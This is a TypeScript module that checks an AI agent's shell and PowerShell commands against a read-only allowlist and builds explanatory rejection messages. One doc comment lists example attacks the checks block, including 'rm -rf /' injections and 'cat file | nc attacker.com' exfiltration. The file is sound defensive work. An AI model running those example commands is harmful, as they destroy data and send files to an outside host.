import { debug } from './utils/debug.ts';
import {
  type ToolCheckConfig,
  type BashRejectionReason,
  findRelevantPatterns,
  findBlockedCommandHint,
  analyzePatternMismatch,
} from './bash-security.ts';
import { looksLikeCmdBuiltin, normalizeWindowsPathsForBashParser } from './windows-paths.ts';
import {
  validateBashCommand,
  hasControlCharacters,
} from './bash-validator.ts';
import {
  validatePowerShellCommand,
  looksLikePowerShell,
  isPowerShellAvailable,
} from './powershell-validator.ts';
import { EXPLORE_MODE_CONFIG } from './mode-types.ts';

/**
 * Get detailed reason why a bash command would be rejected.
 * Returns null if the command is safe, otherwise returns the specific reason.
 *
 * Uses AST-based validation for compound commands (&&, ||, ;) to allow
 * safe compound commands like `git status && git log` while still blocking
 * dangerous constructs.
 *
 * For PowerShell commands (detected by syntax or on Windows), uses the
 * PowerShell validator with native System.Management.Automation parsing.
 *
 * This is used to provide helpful error messages that explain exactly what
 * was blocked and why, helping the agent understand and avoid the issue.
 */
export function getBashRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
  const trimmedCommand = command.trim();

  // Step 1: Check for dangerous control characters (before parsing)
  // These could affect parsing itself, so check first
  const controlChar = hasControlCharacters(trimmedCommand);
  if (controlChar) {
    return {
      type: 'control_char',
      char: controlChar.char,
      charCode: 0, // Not used in new flow, but kept for compatibility
      explanation: controlChar.explanation,
    };
  }

  // Step 2: Determine if this is a PowerShell command
  // Use PS validator only for commands that look like PowerShell syntax.
  // On Windows, non-PowerShell commands (e.g. `git status && git log`) are
  // validated via bash-parser with Windows path normalization instead, because
  // the PS parser has different semantics for redirects, subshells, $(), etc.
  const isWindows = process.platform === 'win32';
  const isPsCommand = looksLikePowerShell(trimmedCommand);

  if (isPsCommand && isPowerShellAvailable()) {
    debug('[Mode] Using PowerShell validator for command:', trimmedCommand);
    return getPowerShellRejectionReason(trimmedCommand, config);
  }

  // Step 2b: On Windows, reject CMD-only syntax early.
  // Commands like `if not exist`, `for /f`, `set VAR=` are Windows CMD builtins
  // that neither bash-parser nor path normalization can handle.
  if (isWindows && looksLikeCmdBuiltin(trimmedCommand)) {
    return {
      type: 'parse_error',
      error: 'Windows CMD syntax (if/for/set/copy/move) is not supported in Explore mode. Use PowerShell equivalents or bash commands instead.',
    };
  }

  // Step 2c: On Windows, normalize backslash paths for bash-parser.
  // bash-parser is POSIX and treats \ as escape chars, mangling Windows paths like
  // C:\Users\... into C:Users... or failing on trailing backslash-quote (\").
  const commandForParser = isWindows
    ? normalizeWindowsPathsForBashParser(trimmedCommand)
    : trimmedCommand;

  // Step 3: Use bash AST-based validation
  // This handles compound commands, pipelines, redirects, and substitutions properly
  const astResult = validateBashCommand(commandForParser, config.readOnlyBashPatterns);

  if (astResult.allowed) {
    debug('[Mode] Command allowed via AST validation:', trimmedCommand);
    return null;
  }

  // Step 3: Convert AST rejection reason to BashRejectionReason
  if (astResult.reason) {
    const reason = astResult.reason;

    switch (reason.type) {
      case 'parse_error':
        return { type: 'parse_error', error: reason.error };

      case 'pipeline':
        // Convert to the legacy format for consistent error messages
        return {
          type: 'dangerous_operator',
          operator: '|',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'redirect':
        return {
          type: 'dangerous_operator',
          operator: reason.op,
          operatorType: 'redirect',
          explanation: reason.explanation,
        };

      case 'command_expansion':
        return {
          type: 'dangerous_substitution',
          pattern: '$()',
          explanation: reason.explanation,
        };

      case 'process_substitution':
        return {
          type: 'dangerous_substitution',
          pattern: '<() or >()',
          explanation: reason.explanation,
        };

      case 'parameter_expansion':
        return {
          type: 'dangerous_substitution',
          pattern: '${} / $VAR',
          explanation: reason.explanation,
        };

      case 'env_assignment':
        return {
          type: 'dangerous_substitution',
          pattern: 'VAR=value',
          explanation: reason.explanation,
        };

      case 'unsafe_command': {
        // Find relevant patterns to help the agent understand what format is expected
        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
        const commandHint = findBlockedCommandHint(reason.command, config);

        return {
          type: 'no_safe_pattern',
          command: reason.command,
          relevantPatterns,
          mismatchAnalysis: mismatchAnalysis ?? undefined,
          commandHint,
        };
      }

      case 'compound_partial_fail':
        // Return info about which commands failed in a compound expression
        return {
          type: 'compound_partial_fail',
          failedCommands: reason.failedCommands,
          passedCommands: reason.passedCommands,
        };

      case 'background_execution':
        // Background execution with & operator - convert to dangerous_operator format
        return {
          type: 'dangerous_operator',
          operator: '&',
          operatorType: 'chain',
          explanation: reason.explanation,
        };
    }
  }

  // Fallback: shouldn't reach here, but return generic rejection if we do
  debug('[Mode] Unexpected: AST rejected but no reason provided');
  return {
    type: 'no_safe_pattern',
    command: trimmedCommand,
    relevantPatterns: [],
    mismatchAnalysis: undefined,
    commandHint: findBlockedCommandHint(trimmedCommand, config),
  };
}

/**
 * Get detailed reason why a PowerShell command would be rejected.
 * Converts PowerShell validation results to BashRejectionReason format
 * for consistent error message handling.
 */
export function getPowerShellRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
  const psResult = validatePowerShellCommand(command, config.readOnlyBashPatterns);

  if (psResult.allowed) {
    debug('[Mode] PowerShell command allowed via AST validation:', command);
    return null;
  }

  // Convert PowerShell rejection reason to BashRejectionReason format
  if (psResult.reason) {
    const reason = psResult.reason;

    switch (reason.type) {
      case 'parse_error':
        return { type: 'parse_error', error: reason.error };

      case 'powershell_unavailable':
        // Fall back to bash validation if PowerShell is not available
        debug('[Mode] PowerShell unavailable, falling back to bash validation');
        return null;

      case 'pipeline':
        return {
          type: 'dangerous_operator',
          operator: '|',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'redirect':
        return {
          type: 'dangerous_operator',
          operator: '>',
          operatorType: 'redirect',
          explanation: reason.explanation,
        };

      case 'subexpression':
        return {
          type: 'dangerous_substitution',
          pattern: '$()',
          explanation: reason.explanation,
        };

      case 'script_block':
        return {
          type: 'dangerous_substitution',
          pattern: '{ }',
          explanation: reason.explanation,
        };

      case 'invoke_expression':
        return {
          type: 'dangerous_substitution',
          pattern: 'Invoke-Expression',
          explanation: reason.explanation,
        };

      case 'dot_sourcing':
        return {
          type: 'dangerous_substitution',
          pattern: '. (dot-sourcing)',
          explanation: reason.explanation,
        };

      case 'assignment':
        return {
          type: 'dangerous_operator',
          operator: '=',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'background_execution':
        return {
          type: 'dangerous_operator',
          operator: '&',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'unsafe_command': {
        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
        const commandHint = findBlockedCommandHint(reason.command, config);

        return {
          type: 'no_safe_pattern',
          command: reason.command,
          relevantPatterns,
          mismatchAnalysis: mismatchAnalysis ?? undefined,
          commandHint,
        };
      }
    }
  }

  // Fallback
  debug('[Mode] Unexpected: PowerShell AST rejected but no reason provided');
  return {
    type: 'no_safe_pattern',
    command: command,
    relevantPatterns: [],
    mismatchAnalysis: undefined,
    commandHint: findBlockedCommandHint(command, config),
  };
}

/**
 * Format actionable guidance for permission customization.
 * Tells the agent where to read/modify permissions.
 */
function formatPermissionGuidance(config: ToolCheckConfig): string {
  const lines: string[] = [];

  // Only include guidance if permission paths are available
  if (config.permissionPaths) {
    lines.push('');
    lines.push('To see what commands are allowed in Explore mode, read:');
    lines.push(`  • ${config.permissionPaths.workspacePath}`);
    lines.push(`  • ${config.permissionPaths.appDefaultPath}`);
    lines.push('');
    lines.push('To understand the permission system and how to customize:');
    lines.push(`  • ${config.permissionPaths.docsPath}`);
  }

  return lines.join('\n');
}

/**
 * Detect known upstream bash-parser tokenizer bugs.
 *
 * bash-parser has longstanding edge cases around quoted `$` / `)` handling
 * that can throw internal errors like `reducers.doubleQuoting`.
 */
function isKnownBashParserTokenizerBug(error: string): boolean {
  const lower = error.toLowerCase();
  return lower.includes('doublequoting') || lower.includes('reducers.doublequoting');
}

/**
 * Format a bash rejection reason into a user-friendly error message.
 * The message explains what was blocked and why, helping the agent understand the issue.
 * Includes actionable guidance on how to customize permissions.
 */
export function formatBashRejectionMessage(reason: BashRejectionReason, config: ToolCheckConfig): string {
  const modeSwitchHint = `Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`;
  const permissionGuidance = formatPermissionGuidance(config);

  switch (reason.type) {
    case 'control_char':
      return `Bash command blocked: contains "${reason.char}" character. ${reason.explanation}. ${modeSwitchHint}`;

    case 'no_safe_pattern': {
      // Build a helpful message showing what patterns might be relevant
      const lines: string[] = [];
      lines.push(`Bash command \`${reason.command}\` is not in the read-only allowlist.`);

      // Prefer deterministic per-command guidance over fuzzy regex diagnostics.
      if (reason.commandHint) {
        lines.push('');
        lines.push(`Why: ${reason.commandHint.reason}`);
        if (reason.commandHint.context) {
          lines.push(`Context: ${reason.commandHint.context}`);
        }
        if (reason.commandHint.tryInstead && reason.commandHint.tryInstead.length > 0) {
          lines.push('Try instead:');
          for (const item of reason.commandHint.tryInstead) {
            lines.push(`  • ${item}`);
          }
        }
        if (reason.commandHint.example) {
          lines.push(`Example: \`${reason.commandHint.example}\``);
        }
      }

      // If we have mismatch analysis, show detailed diagnostics as heuristic guidance.
      if (reason.mismatchAnalysis) {
        const analysis = reason.mismatchAnalysis;
        lines.push('');

        // Show what matched and where it failed
        if (analysis.matchedPrefix) {
          lines.push(`Matched: \`${analysis.matchedPrefix}\` (${analysis.failedAtPosition} chars)`);
        }
        if (analysis.failedToken) {
          lines.push(`Failed at: \`${analysis.failedToken}\` (position ${analysis.failedAtPosition})`);
        }

        // Show the actionable suggestion if we have one
        if (analysis.suggestion) {
          lines.push('');
          lines.push(analysis.suggestion);
        }

        // Show which pattern was closest to matching (heuristic only)
        if (analysis.bestMatchPattern?.comment) {
          lines.push('');
          lines.push(`Closest allowlist hint (heuristic): ${analysis.bestMatchPattern.comment}`);
        }
      } else if (reason.relevantPatterns.length > 0) {
        // Fall back to showing relevant patterns if no mismatch analysis
        lines.push('');
        lines.push('Heuristic relevant pattern(s):');
        for (const pattern of reason.relevantPatterns) {
          // Show the pattern regex (simplified for readability)
          const patternDisplay = pattern.source.length > 80
            ? `${pattern.source.substring(0, 77)}...`
            : pattern.source;
          lines.push(`  Pattern: \`${patternDisplay}\``);
          if (pattern.comment) {
            lines.push(`  → ${pattern.comment}`);
          }
        }
        lines.push('');
        lines.push('The command must match an allowlist pattern exactly from the start.');
      }

      // Add permission guidance for pattern-based rejections
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    case 'dangerous_operator':
      return `Bash command blocked: contains "${reason.operator}" operator. This ${reason.explanation}. Run commands separately or switch to Ask mode.`;

    case 'dangerous_substitution':
      return `Bash command blocked: contains ${reason.pattern} syntax. ${reason.explanation}. ${modeSwitchHint}`;

    case 'parse_error': {
      const lines: string[] = [];
      lines.push(`Bash command blocked: could not parse command safely (${reason.error}).`);

      if (isKnownBashParserTokenizerBug(reason.error)) {
        lines.push('');
        lines.push('This looks like a known bash-parser tokenizer bug (not necessarily unsafe intent).');
        lines.push('Try using single quotes for regex/text arguments instead of double quotes.');
        lines.push('Problematic patterns often involve `$` (and sometimes `)`) inside double-quoted strings.');
        lines.push('Example: `rg -n "a|b|$|c" ...` → `rg -n \'a|b|$|c\' ...`');
      }

      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    case 'compound_partial_fail': {
      // Some commands in a compound expression failed
      const lines: string[] = [];
      lines.push('Bash command blocked: compound command contains unsafe operations.');
      lines.push('');
      if (reason.passedCommands.length > 0) {
        lines.push('✓ Allowed commands:');
        for (const cmd of reason.passedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      if (reason.failedCommands.length > 0) {
        lines.push('✗ Blocked commands (not in read-only allowlist):');
        for (const cmd of reason.failedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      // Add permission guidance for compound command failures
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    // New AST-based types (shouldn't reach here as they're converted above, but handle for completeness)
    case 'pipeline':
      return `Bash command blocked: contains pipeline (|). ${reason.explanation}. ${modeSwitchHint}`;

    case 'redirect':
      return `Bash command blocked: contains "${reason.op}" redirect. This ${reason.explanation}. ${modeSwitchHint}`;

    case 'command_expansion':
      return `Bash command blocked: contains command substitution. ${reason.explanation}. ${modeSwitchHint}`;

    case 'process_substitution':
      return `Bash command blocked: contains process substitution. ${reason.explanation}. ${modeSwitchHint}`;

    case 'parameter_expansion':
      return `Bash command blocked: contains variable expansion (\${} / $VAR). ${reason.explanation}. ${modeSwitchHint}`;

    case 'env_assignment':
      return `Bash command blocked: contains environment variable assignment. ${reason.explanation}. ${modeSwitchHint}`;

    case 'unsafe_command': {
      const lines: string[] = [];
      lines.push(`Bash command blocked: \`${reason.command}\` is not in the read-only allowlist.`);
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }
  }
}

/**
 * Check if a Bash command is read-only using the given config.
 *
 * Uses AST-based validation to properly handle compound commands like
 * `git status && git log` - each part is validated separately, and the
 * command is allowed only if ALL parts pass.
 *
 * A command is considered safe if:
 * 1. It does NOT contain dangerous control characters (newlines, etc.)
 * 2. All simple commands match read-only patterns (including in compound commands)
 * 3. It does NOT contain redirects (>, >>, <) - these modify files
 * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
 * 5. It does NOT run in background (&)
 *
 * Compound commands (&&, ||, |) are allowed when ALL parts are safe:
 * - `git status && git log` is allowed (both commands are safe)
 * - `git log | head` is allowed (both commands are safe)
 *
 * This multi-step check prevents attacks like:
 * - `ls\nrm -rf /` (newline injection)
 * - `git status && rm -rf /` (dangerous command in chain - rm not in allowlist)
 * - `cat file | nc attacker.com` (nc not in allowlist)
 * - `ls $(rm -rf /)` (command substitution)
 */
/**
 * Check if a Bash command is read-only using a custom config.
 * Exported for testing purposes.
 *
 * @param command - The bash command to check
 * @param config - Tool check configuration with patterns
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
  // Use getBashRejectionReason which now uses AST-based validation
  // If no rejection reason, command is safe
  const rejection = getBashRejectionReason(command, config);
  return rejection === null;
}

/**
 * Check if a Bash command is read-only using the default explore mode config.
 * Exported for testing.
 *
 * @param command - The bash command to check
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommand(command: string): boolean {
  return isReadOnlyBashCommandWithConfig(command, EXPLORE_MODE_CONFIG);
}
